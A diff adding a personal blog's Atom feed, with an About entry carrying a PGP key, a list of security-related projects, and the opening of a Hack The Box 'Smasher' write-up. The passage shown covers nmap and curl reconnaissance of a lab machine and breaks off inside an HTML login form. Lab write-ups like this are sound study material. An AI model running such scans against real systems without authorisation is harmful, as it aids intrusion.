@@ -1,0 +1,996 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+    <title>spiperac&#x27;s blog</title>
+    <link rel="self" type="application/atom+xml" href="https://spiperac.dev/atom.xml"/>
+    <link rel="alternate" type="text/html" href="https://spiperac.dev"/>
+    <generator uri="https://www.getzola.org/">Zola</generator>
+    <updated>2024-11-10T00:00:00+00:00</updated>
+    <id>https://spiperac.dev/atom.xml</id>
+    <entry xml:lang="en">
+        <title>About</title>
+        <published>2024-11-10T00:00:00+00:00</published>
+        <updated>2024-11-10T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              spiperac
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://spiperac.dev/about/"/>
+        <id>https://spiperac.dev/about/</id>
+        
+        <content type="html" xml:base="https://spiperac.dev/about/">&lt;p&gt;Hi, im spiperac.&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt; 󰊤 Github: &lt;a href=&quot;http:&#x2F;&#x2F;github.com&#x2F;spiperac&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;github.com&#x2F;spiperac&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;p&gt; 󰇮 Email: &lt; sp &lt; at &gt; spiperac.dev &gt; &lt;&#x2F;p&gt;
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;-----BEGIN PGP PUBLIC KEY BLOCK-----
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;xjMEZ0pJ2hYJKwYBBAHaRw8BAQdARfY7v2tm&#x2F;t2n0rYkATmFUZWoOwgQqpBk
+&lt;&#x2F;span&gt;&lt;span&gt;aQobZuifqfjNIXNwQHNwaXBlcmFjLmRldiA8c3BAc3BpcGVyYWMuZGV2PsLA
+&lt;&#x2F;span&gt;&lt;span&gt;EQQTFgoAgwWCZ0pJ2gMLCQcJkJr1J7Qj3E9yRRQAAAAAABwAIHNhbHRAbm90
+&lt;&#x2F;span&gt;&lt;span&gt;YXRpb25zLm9wZW5wZ3Bqcy5vcmf9JGyShGDv+c5dHAl+D9fS7rWODDsPulB3
+&lt;&#x2F;span&gt;&lt;span&gt;74eOi1xTMAMVCggEFgACAQIZAQKbAwIeARYhBKnF5iZsvUXYMCUtU5r1J7Qj
+&lt;&#x2F;span&gt;&lt;span&gt;3E9yAACpWgD+JlBfS&#x2F;EJexdCxzTjdz7NEtCy3zdPqnFHHdp8Pi6aii8A&#x2F;RxX
+&lt;&#x2F;span&gt;&lt;span&gt;Ll+PLZrsSBeGRP0fgukgmsx41WiTLZH6R+LLD9UEzjgEZ0pJ2hIKKwYBBAGX
+&lt;&#x2F;span&gt;&lt;span&gt;VQEFAQEHQP2Ngy&#x2F;3rYhn1bk59SAUD33Ur0DlfWn0KPmd&#x2F;RaKv8M+AwEIB8K+
+&lt;&#x2F;span&gt;&lt;span&gt;BBgWCgBwBYJnSknaCZCa9Se0I9xPckUUAAAAAAAcACBzYWx0QG5vdGF0aW9u
+&lt;&#x2F;span&gt;&lt;span&gt;cy5vcGVucGdwanMub3JnrUPEJGMHmTmBIlpMoeRX&#x2F;Pclkz20hua1uBKaooFU
+&lt;&#x2F;span&gt;&lt;span&gt;xUQCmwwWIQSpxeYmbL1F2DAlLVOa9Se0I9xPcgAAdu4BAMkDrmUoVMOrjxHP
+&lt;&#x2F;span&gt;&lt;span&gt;RpdF0EIwieo4glIrdBrAN&#x2F;qqXRwLAQDzWNU3&#x2F;qMCjQh6bkAdOb9CLj5fsTk4
+&lt;&#x2F;span&gt;&lt;span&gt;DpOOC&#x2F;EXQO5nAg==
+&lt;&#x2F;span&gt;&lt;span&gt;=6CYq
+&lt;&#x2F;span&gt;&lt;span&gt;-----END PGP PUBLIC KEY BLOCK-----
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Projects</title>
+        <published>2024-11-10T00:00:00+00:00</published>
+        <updated>2024-11-10T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              spiperac
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://spiperac.dev/projects/"/>
+        <id>https://spiperac.dev/projects/</id>
+        
+        <content type="html" xml:base="https://spiperac.dev/projects/">&lt;p class=&quot;icon&quot;&gt; Py projects: &lt;&#x2F;p&gt;
+&lt;ul&gt;
+    &lt;!-- Add custom content about projects --&gt;
+    &lt;li&gt;
+        &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spiperac&#x2F;bCTF&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;bCTF&lt;&#x2F;a&gt; - CTF scoreboard and framework in django. - Archived&lt;&#x2F;u&gt;
+    &lt;&#x2F;li&gt;
+    &lt;li&gt;
+        &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spiperac&#x2F;armroper&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;armroper&lt;&#x2F;a&gt; -  ARM rop chain gadget searcher - &lt;u&gt;Archived&lt;&#x2F;u&gt;
+    &lt;&#x2F;li&gt;
+    &lt;li&gt;
+        &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spiperac&#x2F;virtapi&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;virtAPI ( libvirt) &lt;&#x2F;a&gt; -  libvirt&#x2F;KVM python API wrapper with CLI - &lt;u&gt;Archived&lt;&#x2F;u&gt;
+    &lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p class=&quot;icon&quot;&gt;󱘗 Rust projects: &lt;&#x2F;p&gt;
+&lt;ul&gt;
+    &lt;li&gt;
+        &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;spiperac&#x2F;rfid-rc522-rs&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;rfid-rc522-rs&lt;&#x2F;a&gt; - rust MFRC522 implementation - ( WIP)
+    &lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Smasher HTB 50pts</title>
+        <published>2018-11-22T00:00:00+00:00</published>
+        <updated>2018-11-22T00:00:00+00:00</updated>
+        
+        <author>
+          <name>
+            
+              spiperac
+            
+          </name>
+        </author>
+        
+        <link rel="alternate" type="text/html" href="https://spiperac.dev/posts/smasher-htb-50pts/"/>
+        <id>https://spiperac.dev/posts/smasher-htb-50pts/</id>
+        
+        <content type="html" xml:base="https://spiperac.dev/posts/smasher-htb-50pts/">&lt;h2 id=&quot;smasher&quot;&gt;Smasher&lt;&#x2F;h2&gt;
+&lt;p&gt;A friend of mine suggested me this box as a good &quot;inspiration&quot; for a task for our upcomming CTF at &lt;a href=&quot;http:&#x2F;&#x2F;balccon.org&quot;&gt;BalCCon&lt;&#x2F;a&gt; congress.
+I was immediately hooked by the idea of setting a web challenge as an entry gate for a binary exploitation challenge.&lt;br &#x2F;&gt; That twist gives it a little bit of &#x27;real world&#x27; feeling ( not really), and a better path for libc &#x27;leaking&#x27;, unlike ususal &#x27;here you go, download libc from here&#x27; way.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;vm-enumeration&quot;&gt;VM Enumeration&lt;&#x2F;h2&gt;
+&lt;p&gt;Quick scan with nmap revealed following:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[badarg:~&#x2F;ctf&#x2F;hackthebox&#x2F;box&#x2F;Smasher]$&lt;&#x2F;span&gt;&lt;span&gt; nmap&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -sC -sV&lt;&#x2F;span&gt;&lt;span&gt; 10.10.10.89
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Starting&lt;&#x2F;span&gt;&lt;span&gt; Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;at&lt;&#x2F;span&gt;&lt;span&gt; 2018-10-01 10:28 CEST
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Nmap&lt;&#x2F;span&gt;&lt;span&gt; scan report for 10.10.10.89
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Host&lt;&#x2F;span&gt;&lt;span&gt; is up (0.039s latency)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;.
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Not&lt;&#x2F;span&gt;&lt;span&gt; shown: 998 closed ports
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;PORT&lt;&#x2F;span&gt;&lt;span&gt;     STATE SERVICE         VERSION
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;22&#x2F;tcp&lt;&#x2F;span&gt;&lt;span&gt;   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;protocol&lt;&#x2F;span&gt;&lt;span&gt; 2.0)
+&lt;&#x2F;span&gt;&lt;span&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;ssh-hostkey:
+&lt;&#x2F;span&gt;&lt;span&gt;|   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;2048&lt;&#x2F;span&gt;&lt;span&gt; a6:23:c5:7b:f1:1f:df:68:25:dd:3a:2b:c5:74:00:46 (RSA)
+&lt;&#x2F;span&gt;&lt;span&gt;|   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;256&lt;&#x2F;span&gt;&lt;span&gt; 57:81:a5:46:11:33:27:53:2b:99:29:9a:a8:f3:8e:de (ECDSA)
+&lt;&#x2F;span&gt;&lt;span&gt;|&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_&lt;&#x2F;span&gt;&lt;span&gt;  256 c5:23:c1:7a:96:d6:5b:c0:c4:a5:f8:37:2e:5d:ce:a0 (ED25519)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;1111&#x2F;tcp&lt;&#x2F;span&gt;&lt;span&gt; open  lmsocialserver?
+&lt;&#x2F;span&gt;&lt;span&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fingerprint-strings:
+&lt;&#x2F;span&gt;&lt;span&gt;|   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;FourOhFourRequest,&lt;&#x2F;span&gt;&lt;span&gt; GenericLines, SIPOptions:
+&lt;&#x2F;span&gt;&lt;span&gt;|     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;HTTP&#x2F;1.1&lt;&#x2F;span&gt;&lt;span&gt; 404 Not found
+&lt;&#x2F;span&gt;&lt;span&gt;|     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Server:&lt;&#x2F;span&gt;&lt;span&gt; shenfeng tiny-web-server
+&lt;&#x2F;span&gt;&lt;span&gt;|     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Content-length:&lt;&#x2F;span&gt;&lt;span&gt; 14
+&lt;&#x2F;span&gt;&lt;span&gt;|     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;File&lt;&#x2F;span&gt;&lt;span&gt; not found
+&lt;&#x2F;span&gt;&lt;span&gt;|   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;GetRequest,&lt;&#x2F;span&gt;&lt;span&gt; HTTPOptions, RTSPRequest:
+&lt;&#x2F;span&gt;&lt;span&gt;|     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;HTTP&#x2F;1.1&lt;&#x2F;span&gt;&lt;span&gt; 200 OK
+&lt;&#x2F;span&gt;&lt;span&gt;|     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Server:&lt;&#x2F;span&gt;&lt;span&gt; shenfeng tiny-web-server
+&lt;&#x2F;span&gt;&lt;span&gt;|     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Content-Type:&lt;&#x2F;span&gt;&lt;span&gt; text&#x2F;html
+&lt;&#x2F;span&gt;&lt;span&gt;|     &amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;style&amp;gt;body{font-family: monospace; font-size: 13px;}td &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;{padding:&lt;&#x2F;span&gt;&lt;span&gt; 1.5px 6px;}&amp;lt;&#x2F;style&amp;gt;&amp;lt;&#x2F;head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;table&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;|     &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;href&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;index.html&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;index.html&amp;lt;&#x2F;a&amp;gt;&amp;lt;&#x2F;td&amp;gt;&amp;lt;td&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2018&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-03-31&lt;&#x2F;span&gt;&lt;span&gt; 00:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;57&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;td&amp;gt;&amp;lt;td&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;.1K&amp;lt;&#x2F;td&amp;gt;&amp;lt;&#x2F;tr&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;|&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_    &lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;table&amp;gt;&amp;lt;&#x2F;body&amp;gt;&amp;lt;&#x2F;html&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt; service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;...
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Service&lt;&#x2F;span&gt;&lt;span&gt; detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Nmap&lt;&#x2F;span&gt;&lt;span&gt; done: 1 IP address (1 host up) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;scanned&lt;&#x2F;span&gt;&lt;span&gt; in 124.22 seconds
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;There are SSH and HTTP servers running on this box. HTTP server name(lmsocialserver?)(Server: shenfeng tiny-web-server) doesn&#x27;t look familiar.
+Let&#x27;s see what it does, and check headers.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;[badarg:~&#x2F;ctf&#x2F;hackthebox&#x2F;box&#x2F;Smasher]$&lt;&#x2F;span&gt;&lt;span&gt; curl&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -v&lt;&#x2F;span&gt;&lt;span&gt; http:&#x2F;&#x2F;10.10.10.89:1111&#x2F;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;   Trying 10.10.10.89...
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt; TCP_NODELAY set
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt; Connected to 10.10.10.89 (10.10.10.89) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;port&lt;&#x2F;span&gt;&lt;span&gt; 1111 (#0)
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; GET &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt; HTTP&#x2F;1.1
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; Host: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;10.10.10.89:1111
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; User-Agent: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curl&#x2F;7.54.0
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt; Accept: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;*&#x2F;*
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt; HTTP&#x2F;1.1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;200&lt;&#x2F;span&gt;&lt;span&gt; OK
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt; Server: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;shenfeng&lt;&#x2F;span&gt;&lt;span&gt; tiny-web-server
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt; Content-Type: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;text&#x2F;html
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt; no chunk, no close, no size. Assume close to signal end
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;style&amp;gt;body{font-family: monospace; font-size: 13px;}td &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;{padding:&lt;&#x2F;span&gt;&lt;span&gt; 1.5px 6px;}&amp;lt;&#x2F;style&amp;gt;&amp;lt;&#x2F;head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;table&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;href&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;index.html&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;index.html&amp;lt;&#x2F;a&amp;gt;&amp;lt;&#x2F;td&amp;gt;&amp;lt;td&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2018&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;-03-31&lt;&#x2F;span&gt;&lt;span&gt; 00:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;57&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;td&amp;gt;&amp;lt;td&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;.1K&amp;lt;&#x2F;td&amp;gt;&amp;lt;&#x2F;tr&amp;gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt; Closing connection 0
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;table&amp;gt;&amp;lt;&#x2F;body&amp;gt;&amp;lt;&#x2F;html&amp;gt;%
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Looks like the web server returns a file listing, which shows that there&#x27;s only one file available in that dir, and it&#x27;s index.html.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;form &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;method&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;post&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;action&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;index.php&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;div &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;class&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;box&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;h1&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;Dashboard&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;h1&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;email&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;email&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;email&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;onFocus&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;field_focus(this, &amp;#39;email&amp;#39;);&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;onblur&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;field_blur&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;email&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;);&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;class&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;email&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &#x2F;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;email&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;email&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;onFocus&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;field_focus(this, &amp;#39;email&amp;#39;);&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;onblur&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;field_blur&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;email&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;);&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;class&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;email&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &#x2F;&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;center&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;href&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;#&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;div &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;class&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;btn&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;Login&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;div&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span 